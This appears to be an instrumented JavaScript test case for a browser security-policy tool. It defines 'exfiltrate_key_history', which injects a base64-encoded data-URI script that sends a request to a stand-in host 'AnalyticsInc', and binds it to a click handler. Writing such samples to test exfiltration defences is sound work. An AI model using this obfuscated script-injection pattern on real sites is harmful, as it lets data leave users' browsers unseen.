
JAM.startProfile('load');
function exfiltrate_key_history(){var data="eG1saHR0cD1uZXcgWE1MSHR0cFJlcXVlc3QoKTt4bWxodHRwLm9wZW4oIkdFVCIsICJodHRwOi8vQW5hbHl0aWNzSW5jOjgwMDAvc3VibWlzc2lvbi5odG1sP3Rlc3Q9ZGF0YTIiLCB0cnVlKTt4bWxodHRwLnNlbmQobnVsbCk7",URL="data:text/javascript;base64,"+data,data=document.createElement("script");data.src=URL;URL=document.getElementsByTagName("head");URL=URL[0];JAMScript.call(URL.appendChild,URL,[data])}var v1=document.getElementById("test");JAMScript.set(v1,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
